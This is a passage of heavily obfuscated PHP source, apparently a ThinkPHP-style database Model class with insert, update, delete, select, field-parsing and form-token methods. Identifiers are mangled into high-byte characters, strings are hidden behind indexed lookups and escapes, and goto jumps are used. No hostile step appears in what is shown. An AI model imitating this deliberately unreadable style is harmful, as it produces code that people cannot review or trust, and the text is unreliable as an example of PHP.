self::driverType(IO::init($Ğ³•‹Ù³[$ÅËúìÙ¼[87]])); $Çì¤ù­ë = $¸²Ã€¸¾[$ÅËúìÙ¼[98]]; $†˜¬Ê¿ã = $ÅËúìÙ¼[197]; if ($¸²Ã€¸¾[$ÅËúìÙ¼[33]] == $ÅËúìÙ¼[109]) { $†˜¬Ê¿ã = $ÅËúìÙ¼[1425]; } if ($¸²Ã€¸¾[$ÅËúìÙ¼[98]] && is_array($¸²Ã€¸¾[$ÅËúìÙ¼[98]]->config)) { $ÏÙ¾¸Ùá = $¸²Ã€¸¾[$ÅËúìÙ¼[98]]->config; if (isset($ÏÙ¾¸Ùá[$ÅËúìÙ¼[1426]]) && $ÏÙ¾¸Ùá[$ÅËúìÙ¼[1426]]) { $†˜¬Ê¿ã = $ÅËúìÙ¼[1425]; } } $ï¶—Ô¾ = KodIO::defaultDriver(); if (strtolower($ï¶—Ô¾[$ÅËúìÙ¼[98]]) == $ÅËúìÙ¼[109] && is_array($ï¶—Ô¾[$ÅËúìÙ¼[6]])) { $Ñ´şËÊü = $ï¶—Ô¾[$ÅËúìÙ¼[6]][$ÅËúìÙ¼[1278]]; if (substr($Ñ´şËÊü, 0, 2) == $ÅËúìÙ¼[1427]) { $Ñ´şËÊü = str_replace($ÅËúìÙ¼[1427], BASIC_PATH, $Ñ´şËÊü); } $Ñ´şËÊü = str_replace($ÅËúìÙ¼[257], $ÅËúìÙ¼[8], $Ñ´şËÊü); if (substr($Ğ³•‹Ù³[$ÅËúìÙ¼[87]], 0, strlen($Ñ´şËÊü)) == $Ñ´şËÊü) { $†˜¬Ê¿ã = $ÅËúìÙ¼[197]; } } } return $†˜¬Ê¿ã == $ÅËúìÙ¼[1425] ? !0 : !1; } } goto b±ƒëø±£›; e‹Å¨Ê“®ï: define($_SERVER[‹‰”››ê][332], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\162\x64\x65\162", "\x61\154\151\141\x73", "\150\x61\166\x69\156\x67", "\x67\162\157\165\x70", "\x6c\x6f\x63\153", "\x64\x69\x73\x74\151\x6e\143\164", "\x61\x75\x74\157", "\146\x69\154\164\x65\162", "\x76\141\x6c\151\x64\141\x74\x65", "\162\x65\163\165\x6c\x74", "\142\151\156\144", "\164\157\153\145\156"); public function __construct($Ú£çé˜¸ = '', $Ñ®ø˜êŠ = '', $›«Á†º = '') { $ø©‹±©É =& $_SERVER[‹‰”››ê]; $this->_initialize(); if (!empty($Ú£çé˜¸)) { if (strpos($Ú£çé˜¸, $ø©‹±©É[10])) { list($this->dbName, $this->name) = explode($ø©‹±©É[10], $Ú£çé˜¸); } else { $this->name = $Ú£çé˜¸; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ñ®ø˜êŠ)) { $this->tablePrefix = $ø©‹±©É[12]; } elseif ($ø©‹±©É[12] != $Ñ®ø˜êŠ) { $this->tablePrefix = $Ñ®ø˜êŠ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ø©‹±©É[333]); } $this->db(0, empty($this->connection) ? $›«Á†º : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Äôõù–ì =& $_SERVER[‹‰”››ê]; if (empty($this->fields)) { if (think_config($Äôõù–ì[334])) { $ï¯‚°§‘ = $this->dbName ? $this->dbName : think_config($Äôõù–ì[335]); $‘€ì¦¾ = think_var_cache($Äôõù–ì[336] . strtolower(get_path_this($ï¯‚°§‘) . $Äôõù–ì[10] . $this->name)); if ($‘€ì¦¾) { $ù¯à©í¢ = think_config($Äôõù–ì[337]); if (empty($ù¯à©í¢) || $‘€ì¦¾[$Äôõù–ì[338]] == $ù¯à©í¢) { $this->fields = $‘€ì¦¾; return; } } } $this->flush(); } } public function flush() { $ò¿ÀÅøã =& $_SERVER[‹‰”››ê]; $this->db->setModel($this->name); $ÊÌ¼úíÂ = $this->db->getFields($this->getTableName()); if (!$ÊÌ¼úíÂ) { return !1; } $this->fields = array_keys($ÊÌ¼úíÂ); $this->fields[$ò¿ÀÅøã[339]] = !1; foreach ($ÊÌ¼úíÂ as $ÂÉà‰ªÊ => $à—‘ÑÉç) { $–Ö«†õ“[$ÂÉà‰ªÊ] = $à—‘ÑÉç[$ò¿ÀÅøã[33]]; if ($à—‘ÑÉç[$ò¿ÀÅøã[39]]) { $this->fields[$ò¿ÀÅøã[340]] = $ÂÉà‰ªÊ; if ($à—‘ÑÉç[$ò¿ÀÅøã[42]]) { $this->fields[$ò¿ÀÅøã[339]] = !0; } } } $this->fields[$ò¿ÀÅøã[341]] = $–Ö«†õ“; if (think_config($ò¿ÀÅøã[337])) { $this->fields[$ò¿ÀÅøã[338]] = think_config($ò¿ÀÅøã[337]); } if (think_config($ò¿ÀÅøã[334])) { $¯İÂªúà = $this->dbName ? $this->dbName : think_config($ò¿ÀÅøã[335]); think_var_cache($ò¿ÀÅøã[336] . strtolower(get_path_this($¯İÂªúà) . $ò¿ÀÅøã[10] . $this->name), $this->fields); } } public function switchModel($ÖÃªË¶ş, $Åû¡Õæı = array()) { $èÅÜàü¥ =& $_SERVER[‹‰”››ê]; $é¨ç–ÑÉ = ucwords(strtolower($ÖÃªË¶ş)) . $èÅÜàü¥[342]; if (!class_exists($é¨ç–ÑÉ)) { think_exception($é¨ç–ÑÉ . think_lang($èÅÜàü¥[343])); } $this->_extModel = new $é¨ç–ÑÉ($this->name); if (!empty($Åû¡Õæı)) { foreach ($Åû¡Õæı as $Âş‘ñà) { $this->_extModel->setProperty($Âş‘ñà, $this->{$Âş‘ñà}); } } return $this->_extModel; } public function __set($è”ÙğìÁ, $Ö«ˆÎôÀ) { $this->data[$è”ÙğìÁ] = $Ö«ˆÎôÀ; } public function __get($ÌÕÊÛ’) { return isset($this->data[$ÌÕÊÛ’]) ? $this->data[$ÌÕÊÛ’] : null; } public function __isset($ÛÍŒ¦şè) { return isset($this->data[$ÛÍŒ¦şè]); } public function __unset($˜«Ï¿Ş‹) { unset($this->data[$˜«Ï¿Ş‹]); } public function __call($ä„Ëß², $ŸƒÈ³€ï) { $õâóîö¦ =& $_SERVER[‹‰”››ê]; if (in_array(strtolower($ä„Ëß²), $this->methods, !0)) { $this->options[strtolower($ä„Ëß²)] = $ŸƒÈ³€ï[0]; return $this; } elseif (in_array(strtolower($ä„Ëß²), array($õâóîö¦[344], $õâóîö¦[345], $õâóîö¦[346], $õâóîö¦[347], $õâóîö¦[348]), !0)) { $³Ïİü¼¾ = isset($ŸƒÈ³€ï[0]) ? $ŸƒÈ³€ï[0] : $õâóîö¦[223]; $³Ïİü¼¾ = $this->db->parseKey($³Ïİü¼¾); return $this->getField(strtoupper($ä„Ëß²) . $õâóîö¦[349] . $³Ïİü¼¾ . $õâóîö¦[350] . $ä„Ëß², $õâóîö¦[344]); } elseif (strtolower(substr($ä„Ëß², 0, 5)) == $õâóîö¦[351]) { $³Ïİü¼¾ = think_parse_name(substr($ä„Ëß², 5)); $ùÆ½šÜÎ[$³Ïİü¼¾] = $ŸƒÈ³€ï[0]; return $this->where($ùÆ½šÜÎ)->find(); } elseif (strtolower(substr($ä„Ëß², 0, 10)) == $õâóîö¦[352]) { $ªéÙÈ‰€ = think_parse_name(substr($ä„Ëß², 10)); $ùÆ½šÜÎ[$ªéÙÈ‰€] = $ŸƒÈ³€ï[0]; return $this->where($ùÆ½šÜÎ)->getField($ŸƒÈ³€ï[1]); } elseif (isset($this->_scope[$ä„Ëß²])) { return $this->scope($ä„Ëß², $ŸƒÈ³€ï[0]); } elseif (method_exists($this, $ä„Ëß²)) { array_unshift($ŸƒÈ³€ï, $ä„Ëß²); return call_user_func_array(array($this, $õâóîö¦[353]), $ŸƒÈ³€ï); } else { return call_user_func_array(array(parent, $ä„Ëß²), $ŸƒÈ³€ï); } } protected function call() { $Ğ¿Ó¡‡î =& $_SERVER[‹‰”››ê]; $ŞÛ¼Ÿ÷Œ = func_get_args(); $şŞ‰÷Ğ‡ = array_shift($ŞÛ¼Ÿ÷Œ); $ıÙø½”Ù = $şŞ‰÷Ğ‡; if (is_array($şŞ‰÷Ğ‡)) { $ıÙø½”Ù = $şŞ‰÷Ğ‡[1]; $şŞ‰÷Ğ‡ = $şŞ‰÷Ğ‡[0]; } $éÀç£¼í = count($ŞÛ¼Ÿ÷Œ) - 1; if (isset($ŞÛ¼Ÿ÷Œ[$éÀç£¼í]) && $ŞÛ¼Ÿ÷Œ[$éÀç£¼í] === $şŞ‰÷Ğ‡) { think_exception(__CLASS__ . $Ğ¿Ó¡‡î[4] . $şŞ‰÷Ğ‡ . think_lang($Ğ¿Ó¡‡î[354])); return; } $ŞÛ¼Ÿ÷Œ[] = $şŞ‰÷Ğ‡; if (method_exists($this, $Ğ¿Ó¡‡î[355])) { $ŒºÊ–ÇÂ = call_user_func_array(array($this, $Ğ¿Ó¡‡î[356]), array($ıÙø½”Ù, $ŞÛ¼Ÿ÷Œ)); if (!is_null($ŒºÊ–ÇÂ) && $ŒºÊ–ÇÂ !== !1) { return $ŒºÊ–ÇÂ; } } $ˆ‡Ÿœ—ö = call_user_func_array(array($this, $şŞ‰÷Ğ‡), $ŞÛ¼Ÿ÷Œ); if (method_exists($this, $Ğ¿Ó¡‡î[357])) { $ŒºÊ–ÇÂ = call_user_func_array(array($this, $Ğ¿Ó¡‡î[358]), array($ıÙø½”Ù, $ŞÛ¼Ÿ÷Œ, $ˆ‡Ÿœ—ö)); if ($ŒºÊ–ÇÂ) { return $ŒºÊ–ÇÂ; } } return $ˆ‡Ÿœ—ö; } protected function _initialize() { } protected function _facade($Š™«óµß) { $­š¶†ƒü =& $_SERVER[‹‰”››ê]; if (!empty($this->fields)) { foreach ($Š™«óµß as $ÎÅè­Ş => $õ²œ¯é‡) { if (is_array($this->fields) && !in_array($ÎÅè­Ş, $this->fields, !0)) { unset($Š™«óµß[$ÎÅè­Ş]); } elseif (is_scalar($õ²œ¯é‡)) { $this->_parseType($Š™«óµß, $ÎÅè­Ş); } } } if (!empty($this->options[$­š¶†ƒü[359]])) { $Š™«óµß = array_map($this->options[$­š¶†ƒü[359]], $Š™«óµß); unset($this->options[$­š¶†ƒü[359]]); } $this->_beforeWrite($Š™«óµß); return $Š™«óµß; } protected function _beforeWrite(&$¶™¿«´ª) { } public function add($ÉÕşÅ¬ä = '', $§…À–óã = array(), $Ó³ùˆ²÷ = false) { if (empty($ÉÕşÅ¬ä)) { if (!empty($this->data)) { $ÉÕşÅ¬ä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‹‰”››ê][360]); return !1; } } $§…À–óã = $this->_parseOptions($§…À–óã); $ÉÕşÅ¬ä = $this->_facade($ÉÕşÅ¬ä); if (!1 === $this->_beforeInsert($ÉÕşÅ¬ä, $§…À–óã)) { return !1; } $­÷Æ±© = $this->db->insert($ÉÕşÅ¬ä, $§…À–óã, $Ó³ùˆ²÷); if (!1 !== $­÷Æ±©) { $¼‰£­èÃ = $this->getLastInsID(); if ($¼‰£­èÃ) { $ÉÕşÅ¬ä[$this->getPk()] = $¼‰£­èÃ; $this->_after_insert($ÉÕşÅ¬ä, $§…À–óã); return $¼‰£­èÃ; } $this->_after_insert($ÉÕşÅ¬ä, $§…À–óã); } return $­÷Æ±©; } protected function _beforeInsert(&$Ğ“âÃ‰˜, $š÷£ĞÄó) { } protected function _after_insert($ÚÙ¯òà, $›ŒÆ÷ËÛ) { } public function addAll($ô•ÉÈ‹ƒ, $ö·Í¢¹ = array(), $Òœ€³†ƒ = false) { $à‰ƒ¢ã˜ =& $_SERVER[‹‰”››ê]; if (empty($ô•ÉÈ‹ƒ)) { $this->error = think_lang($à‰ƒ¢ã˜[360]); return !1; } $ö·Í¢¹ = $this->_parseOptions($ö·Í¢¹); foreach ($ô•ÉÈ‹ƒ as $“ŸÅ¼áÅ => $Ï‘ºÌÅ‰) { $ô•ÉÈ‹ƒ[$“ŸÅ¼áÅ] = $this->_facade($Ï‘ºÌÅ‰); } if (method_exists($this->db, $à‰ƒ¢ã˜[361])) { $£Ü³ÎúØ = $this->db->insertAll($ô•ÉÈ‹ƒ, $ö·Í¢¹, $Òœ€³†ƒ); } else { $this->startTrans(); foreach ($ô•ÉÈ‹ƒ as $“ŸÅ¼áÅ => $Ï‘ºÌÅ‰) { $£Ü³ÎúØ = $this->db->insert($Ï‘ºÌÅ‰, $ö·Í¢¹, $Òœ€³†ƒ); } $this->commit(); } if (!1 !== $£Ü³ÎúØ) { $Ô‰¢Ø¸¶ = $this->getLastInsID(); if ($Ô‰¢Ø¸¶) { return $Ô‰¢Ø¸¶; } } return $£Ü³ÎúØ; } public function selectAdd($Êæ§ƒË¿ = '', $¾Ø­æØû = '', $üñÈÙÆƒ = array()) { $„‘—œ† =& $_SERVER[‹‰”››ê]; $üñÈÙÆƒ = $this->_parseOptions($üñÈÙÆƒ); if (!1 === ($ÉËÕÍªú = $this->db->selectInsert($Êæ§ƒË¿ ? $Êæ§ƒË¿ : $üñÈÙÆƒ[$„‘—œ†[362]], $¾Ø­æØû ? $¾Ø­æØû : $this->getTableName(), $üñÈÙÆƒ))) { $this->error = think_lang($„‘—œ†[363]); return !1; } else { return $ÉËÕÍªú; } } public function save($ã—Şº´Ñ = '', $Ãùæû×î = array()) { $—Œ²¡— =& $_SERVER[‹‰”››ê]; if (empty($ã—Şº´Ñ)) { if (!empty($this->data)) { $ã—Şº´Ñ = $this->data; $this->data = array(); } else { $this->error = think_lang($—Œ²¡—[360]); return !1; } } $ã—Şº´Ñ = $this->_facade($ã—Şº´Ñ); $Ãùæû×î = $this->_parseOptions($Ãùæû×î); $îäÊ§à‘ = $this->getPk(); if (!isset($Ãùæû×î[$—Œ²¡—[364]])) { if (isset($ã—Şº´Ñ[$îäÊ§à‘])) { $¼üú–…ª[$îäÊ§à‘] = $ã—Şº´Ñ[$îäÊ§à‘]; $Ãùæû×î[$—Œ²¡—[364]] = $¼üú–…ª; unset($ã—Şº´Ñ[$îäÊ§à‘]); } else { $this->error = think_lang($—Œ²¡—[363]); return !1; } } if (is_array($Ãùæû×î[$—Œ²¡—[364]]) && isset($Ãùæû×î[$—Œ²¡—[364]][$îäÊ§à‘])) { $©É²ÅÕ = $Ãùæû×î[$—Œ²¡—[364]][$îäÊ§à‘]; } if (!1 === $this->_beforeUpdate($ã—Şº´Ñ, $Ãùæû×î)) { return !1; } $»£··š = $this->db->update($ã—Şº´Ñ, $Ãùæû×î); if (!1 !== $»£··š) { if (isset($©É²ÅÕ)) { $ã—Şº´Ñ[$îäÊ§à‘] = $©É²ÅÕ; } $this->_afterUpdate($ã—Şº´Ñ, $Ãùæû×î); } return $»£··š; } protected function _beforeUpdate(&$ìï‰·â„, $üííïêš) { } protected function _afterUpdate($ˆÆÜ¿“¥, $şÖ—™§Œ) { } public function delete($êÛ¼€ù = array()) { $¿‡Øêóï =& $_SERVER[‹‰”››ê]; if (empty($êÛ¼€ù) && empty($this->options[$¿‡Øêóï[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ñÕßğ³§ = $this->getPk(); if (is_numeric($êÛ¼€ù) || is_string($êÛ¼€ù)) { if (strpos($êÛ¼€ù, $¿‡Øêóï[50])) { $³ë˜ÜìÂ[$ñÕßğ³§] = array($¿‡Øêóï[365], $êÛ¼€ù); } else { $³ë˜ÜìÂ[$ñÕßğ³§] = $êÛ¼€ù; } $this->options[$¿‡Øêóï[364]] = $³ë˜ÜìÂ; } $êÛ¼€ù = $this->_parseOptions(); if (is_array($êÛ¼€ù[$¿‡Øêóï[364]]) && isset($êÛ¼€ù[$¿‡Øêóï[364]][$ñÕßğ³§])) { $õ‘´õë¯ = $êÛ¼€ù[$¿‡Øêóï[364]][$ñÕßğ³§]; } $’Æ›¨Í¶ = $this->db->delete($êÛ¼€ù); if (!1 !== $’Æ›¨Í¶) { $©¤¼Ûƒ = array(); if (isset($õ‘´õë¯)) { $©¤¼Ûƒ[$ñÕßğ³§] = $õ‘´õë¯; } $this->_after_delete($©¤¼Ûƒ, $êÛ¼€ù); } return $’Æ›¨Í¶; } protected function _after_delete($´­½•û, $üÛ©÷ö) { } public function select($æ³¡ö = array()) { $Ë—¿ÍÃ· =& $_SERVER[‹‰”››ê]; if (is_string($æ³¡ö) || is_numeric($æ³¡ö)) { $Ö‡‹¶ªŠ = $this->getPk(); if (strpos($æ³¡ö, $Ë—¿ÍÃ·[50])) { $ùÃ’„¨[$Ö‡‹¶ªŠ] = array($Ë—¿ÍÃ·[365], $æ³¡ö); } else { $ùÃ’„¨[$Ö‡‹¶ªŠ] = $æ³¡ö; } $this->options[$Ë—¿ÍÃ·[364]] = $ùÃ’„¨; } elseif (!1 === $æ³¡ö) { $æ³¡ö = $this->_parseOptions(); return $Ë—¿ÍÃ·[366] . $this->db->buildSelectSql($æ³¡ö) . $Ë—¿ÍÃ·[367]; } $æ³¡ö = $this->_parseOptions(); $•âœ¡Åã = $this->db->select($æ³¡ö); if (!1 === $•âœ¡Åã) { return !1; } if (empty($•âœ¡Åã)) { return null; } $this->_afterSelect($•âœ¡Åã, $æ³¡ö); return $•âœ¡Åã; } protected function _afterSelect(&$À¸Ë¥ó–, $§ö³â°‹) { } public function buildSql($ƒ†‡¤©× = array()) { $³²ß¸¢ß =& $_SERVER[‹‰”››ê]; $ƒ†‡¤©× = $this->_parseOptions($ƒ†‡¤©×); return $³²ß¸¢ß[366] . $this->db->buildSelectSql($ƒ†‡¤©×) . $³²ß¸¢ß[367]; } public function optionsValue($ªãÒ…™† = null) { if (is_null($ªãÒ…™†)) { return $this->options; } elseif (is_array($ªãÒ…™†)) { $this->options = array_merge($this->options, $ªãÒ…™†); } } protected function _parseOptions($Æùşã¥Ò = array()) { $åË¶ÁÃœ =& $_SERVER[‹‰”››ê]; if (is_array($Æùşã¥Ò)) { $Æùşã¥Ò = array_merge($this->options, $Æùşã¥Ò); } $this->options = array(); if (!isset($Æùşã¥Ò[$åË¶ÁÃœ[368]])) { $Æùşã¥Ò[$åË¶ÁÃœ[368]] = $this->getTableName(); $ïºÂÑ—¼ = $this->fields; } else { $ïºÂÑ—¼ = $this->getDbFields(); } if (!empty($Æùşã¥Ò[$åË¶ÁÃœ[369]])) { $Æùşã¥Ò[$åË¶ÁÃœ[368]] .= $åË¶ÁÃœ[53] . $Æùşã¥Ò[$åË¶ÁÃœ[369]]; } $Æùşã¥Ò[$åË¶ÁÃœ[370]] = $this->name; if (isset($Æùşã¥Ò[$åË¶ÁÃœ[364]]) && is_array($Æùşã¥Ò[$åË¶ÁÃœ[364]]) && !empty($ïºÂÑ—¼) && !isset($Æùşã¥Ò[$åË¶ÁÃœ[371]]) && !isset($Æùşã¥Ò[$åË¶ÁÃœ[368]])) { foreach ($Æùşã¥Ò[$åË¶ÁÃœ[364]] as $×ğİ¡• => $ºŞ–Ä…Ù) { $×ğİ¡• = trim($×ğİ¡•); if (in_array($×ğİ¡•, $ïºÂÑ—¼, !0)) { if (is_scalar($ºŞ–Ä…Ù)) { $this->_parseType($Æùşã¥Ò[$åË¶ÁÃœ[364]], $×ğİ¡•); } } elseif (!is_numeric($×ğİ¡•) && $åË¶ÁÃœ[11] != substr($×ğİ¡•, 0, 1) && !1 === strpos($×ğİ¡•, $åË¶ÁÃœ[10]) && !1 === strpos($×ğİ¡•, $åË¶ÁÃœ[349]) && !1 === strpos($×ğİ¡•, $åË¶ÁÃœ[215]) && !1 === strpos($×ğİ¡•, $åË¶ÁÃœ[287])) { unset($Æùşã¥Ò[$åË¶ÁÃœ[364]][$×ğİ¡•]); } } } $this->_options_filter($Æùşã¥Ò); return $Æùşã¥Ò; } protected function _options_filter(&$í¼ÌÚªÜ) { } protected function _parseType(&$ÔöË¯ü°, $€ÉÓ¾ºî) { $ïË•»€” =& $_SERVER[‹‰”››ê]; if (empty($this->options[$ïË•»€”[372]][$ïË•»€”[4] . $€ÉÓ¾ºî])) { $…Âñ‰·‹ = strtolower($this->fields[$ïË•»€”[341]][$€ÉÓ¾ºî]); if (!1 !== strpos($…Âñ‰·‹, $ïË•»€”[373])) { } elseif (!1 === strpos($…Âñ‰·‹, $ïË•»€”[374]) && !1 !== strpos($…Âñ‰·‹, $ïË•»€”[375])) { $ÔöË¯ü°[$€ÉÓ¾ºî] = intval($ÔöË¯ü°[$€ÉÓ¾ºî]); } elseif (!1 !== strpos($…Âñ‰·‹, $ïË•»€”[376]) || !1 !== strpos($…Âñ‰·‹, $ïË•»€”[377])) { $ÔöË¯ü°[$€ÉÓ¾ºî] = floatval($ÔöË¯ü°[$€ÉÓ¾ºî]); } elseif (!1 !== strpos($…Âñ‰·‹, $ïË•»€”[378])) { $ÔöË¯ü°[$€ÉÓ¾ºî] = (bool) $ÔöË¯ü°[$€ÉÓ¾ºî]; } } } public function find($Ï·ââº… = array()) { $™Œ²°İÛ =& $_SERVER[‹‰”››ê]; if (is_numeric($Ï·ââº…) || is_string($Ï·ââº…)) { $³íÜş­[$this->getPk()] = intval($Ï·ââº…); $this->options[$™Œ²°İÛ[364]] = $³íÜş­; } $this->options[$™Œ²°İÛ[379]] = 1; $Ï·ââº… = $this->_parseOptions(); $›° âÖ‹ = $this->db->select($Ï·ââº…); if (!1 === $›° âÖ‹) { return !1; } if (empty($›° âÖ‹)) { return null; } $this->data = $›° âÖ‹[0]; $this->_afterFind($this->data, $Ï·ââº…); if (!empty($this->options[$™Œ²°İÛ[380]])) { return $this->returnResult($this->data, $this->options[$™Œ²°İÛ[380]]); } return $this->data; } protected function _afterFind(&$Øœòçİ¸, $õÅñÛíç) { } protected function returnResult($Ü›Øì°, $¿İãºÜ = '') { $Ÿ³ôÏ =& $_SERVER[‹‰”››ê]; if ($¿İãºÜ) { if (is_callable($¿İãºÜ)) { return call_user_func($¿İãºÜ, $Ü›Øì°); } switch (strtolower($¿İãºÜ)) { case $Ÿ³ôÏ[381]: return json_encode($Ü›Øì°); case $Ÿ³ôÏ[382]: return xml_encode($Ü›Øì°); } } return $Ü›Øì°; } public function parseFieldsMap($âÌÒÊ‰ú, $Ú‚ÁÃÍ÷ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $½¤„’á => $ÈùÎ¨) { if ($Ú‚ÁÃÍ÷ == 1) { if (isset($âÌÒÊ‰ú[$ÈùÎ¨])) { $âÌÒÊ‰ú[$½¤„’á] = $âÌÒÊ‰ú[$ÈùÎ¨]; unset($âÌÒÊ‰ú[$ÈùÎ¨]); } } else { if (isset($âÌÒÊ‰ú[$½¤„’á])) { $âÌÒÊ‰ú[$ÈùÎ¨] = $âÌÒÊ‰ú[$½¤„’á]; unset($âÌÒÊ‰ú[$½¤„’á]); } } } } return $âÌÒÊ‰ú; } public function setField($×ÓŸ¡Ëç, $ËùŠ· = '') { if (is_array($×ÓŸ¡Ëç)) { $¤®Å»ˆö = $×ÓŸ¡Ëç; } else { $¤®Å»ˆö[$×ÓŸ¡Ëç] = $ËùŠ·; } return $this->save($¤®Å»ˆö); } public function setAdd($œ¶ÜÅ¯¸, $ø«şû› = 1) { $ñ¸È¾ =& $_SERVER[‹‰”››ê]; $›ŞŒ’º = $œ¶ÜÅ¯¸ . $ñ¸È¾[383] . $ø«şû›; if ($ø«şû› < 0) { $›ŞŒ’º = $œ¶ÜÅ¯¸ . $ø«şû›; } return $this->setField($œ¶ÜÅ¯¸, array($ñ¸È¾[384], $›ŞŒ’º)); } public function getField($ŠÃ™çÂÆ, $ğñ¿¯üü = null) { $Œùó¾«Å =& $_SERVER[‹‰”››ê]; $Ò„àğ°[$Œùó¾«Å[362]] = $ŠÃ™çÂÆ; $Ò„àğ° = $this->_parseOptions($Ò„àğ°); $ŠÃ™çÂÆ = trim($ŠÃ™çÂÆ); if (strpos($ŠÃ™çÂÆ, $Œùó¾«Å[50])) { if (!isset($Ò„àğ°[$Œùó¾«Å[379]])) { $Ò„àğ°[$Œùó¾«Å[379]] = is_numeric($ğñ¿¯üü) ? $ğñ¿¯üü : $Œùó¾«Å[12]; } $Ó·ÇÉ÷¥ = $this->db->select($Ò„àğ°); if (!empty($Ó·ÇÉ÷¥)) { $üšÙ–°¥ = explode($Œùó¾«Å[50], $ŠÃ™çÂÆ); $ŠÃ™çÂÆ = array_keys($Ó·ÇÉ÷¥[0]); $Ò‹µó³µ = array_shift($ŠÃ™çÂÆ); $‘Ï‡ò¯ò = array_shift($ŠÃ™çÂÆ); $æ´¼Óá = array(); $ïÂÙÁ±é = count($üšÙ–°¥); foreach ($Ó·ÇÉ÷¥ as $®Ô¤ù±­) { $À°¿€¯ = $®Ô¤ù±­[$Ò‹µó³µ]; if (2 == $ïÂÙÁ±é) { $æ´¼Óá[$À°¿€¯] = $®Ô¤ù±­[$‘Ï‡ò¯ò]; } else { $æ´¼Óá[$À°¿€¯] = is_string($ğñ¿¯üü) ? implode($ğñ¿¯üü, $®Ô¤ù±­) : $®Ô¤ù±­; } } return $æ´¼Óá; } } else { if (!0 !== $ğñ¿¯üü) { $Ò„àğ°[$Œùó¾«Å[379]] = is_numeric($ğñ¿¯üü) ? $ğñ¿¯üü : 1; } if ($ğñ¿¯üü === $Œùó¾«Å[344]) { unset($Ò„àğ°[$Œùó¾«Å[379]]); } $®Ô¤ù±­ = $this->db->select($Ò„àğ°); if (!empty($®Ô¤ù±­)) { if ($ğñ¿¯üü === $Œùó¾«Å[344]) { return reset($®Ô¤ù±­[0]); } if (!0 !== $ğñ¿¯üü && 1 == $Ò„àğ°[$Œùó¾«Å[379]]) { return reset($®Ô¤ù±­[0]); } foreach ($®Ô¤ù±­ as $¿ëÜ Â) { $¦†»‚åõ[] = $¿ëÜ Â[$ŠÃ™çÂÆ]; } return $¦†»‚åõ; } } return null; } public function create($êù²Ö€ù = '', $Ç¢ÊñĞ® = '') { $î›©¼†è =& $_SERVER[‹‰”››ê]; if (empty($êù²Ö€ù)) { $êù²Ö€ù = $_POST; } elseif (is_object($êù²Ö€ù)) { $êù²Ö€ù = get_object_vars($êù²Ö€ù); } if (empty($êù²Ö€ù) || !is_array($êù²Ö€ù)) { $this->error = think_lang($î›©¼†è[360]); return !1; } $êù²Ö€ù = $this->parseFieldsMap($êù²Ö€ù, 0); $Ç¢ÊñĞ® = $Ç¢ÊñĞ® ? $Ç¢ÊñĞ® : (!empty($êù²Ö€ù[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$î›©¼†è[362]])) { $¿¤ñøÕø = $this->options[$î›©¼†è[362]]; unset($this->options[$î›©¼†è[362]]); } elseif ($Ç¢ÊñĞ® == THINK_MODEL_INSERT && isset($this->insertFields)) { $¿¤ñøÕø = $this->insertFields; } elseif ($Ç¢ÊñĞ® == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¿¤ñøÕø = $this->updateFields; } if (isset($¿¤ñøÕø)) { if (is_string($¿¤ñøÕø)) { $¿¤ñøÕø = explode($î›©¼†è[50], $¿¤ñøÕø); } if (think_config($î›©¼†è[385])) { $¿¤ñøÕø[] = think_config($î›©¼†è[386]); } foreach ($êù²Ö€ù as $í©±ô¤é => $×¢†é¥) { if (!in_array($í©±ô¤é, $¿¤ñøÕø)) { unset($êù²Ö€ù[$í©±ô¤é]); } } } if (!$this->autoValidation($êù²Ö€ù, $Ç¢ÊñĞ®)) { return !1; } if (!$this->autoCheckToken($êù²Ö€ù)) { $this->error = think_lang($î›©¼†è[387]); return !1; } if ($this->autoCheckFields) { $¿¤ñøÕø = $this->getDbFields(); foreach ($êù²Ö€ù as $í©±ô¤é => $×¢†é¥) { if (!in_array($í©±ô¤é, $¿¤ñøÕø)) { unset($êù²Ö€ù[$í©±ô¤é]); } elseif (MAGIC_QUOTES_GPC && is_string($×¢†é¥)) { $êù²Ö€ù[$í©±ô¤é] = stripslashes($×¢†é¥); } } } $this->autoOperation($êù²Ö€ù, $Ç¢ÊñĞ®); $this->data = $êù²Ö€ù; return $êù²Ö€ù; } public function autoCheckToken($ƒ„À§) { $¦š¹¯‚¢ =& $_SERVER[‹‰”››ê]; if (isset($this->options[$¦š¹¯‚¢[388]]) && !$this->options[$¦š¹¯‚¢[388]]) { return !0; } if (think_config($¦š¹¯‚¢[385])) { $ãÖ¨¾İÌ = think_config($¦š¹¯‚¢[386]); if (!isset($ƒ„À§[$ãÖ¨¾İÌ]) || Session::get($ãÖ¨¾İÌ)) { return !1; } list($»«Ÿ¬Ïõ, $„Öô¦€Ï) = explode($¦š¹¯‚¢[11], $ƒ„À§[$ãÖ¨¾İÌ]); if ($„Öô¦€Ï && Session::get($ãÖ¨¾İÌ . $¦š¹¯‚¢[10] . $»«Ÿ¬Ïõ) === $„Öô¦€Ï) { Session::remove($ãÖ¨¾İÌ . $¦š¹¯‚¢[10] . $»«Ÿ¬Ïõ); return !0; } if (think_config($¦š¹¯‚¢[389])) { Session::remove($ãÖ¨¾İÌ . $¦š¹¯‚¢[10] . $»«Ÿ¬Ïõ); } return !1; } return !0; } public function regex($İíÀìÀÕ, $²Üîê·Ó) { $‰¬ü¿ÂÜ =& $_SERVER[‹‰”››ê]; $ØÔ½‹á = array($‰¬ü¿ÂÜ[390] => $‰¬ü¿ÂÜ[391], $‰¬ü¿ÂÜ[392] => $‰¬ü¿ÂÜ[393], $‰¬ü¿ÂÜ[394] => $‰¬ü¿ÂÜ[395], 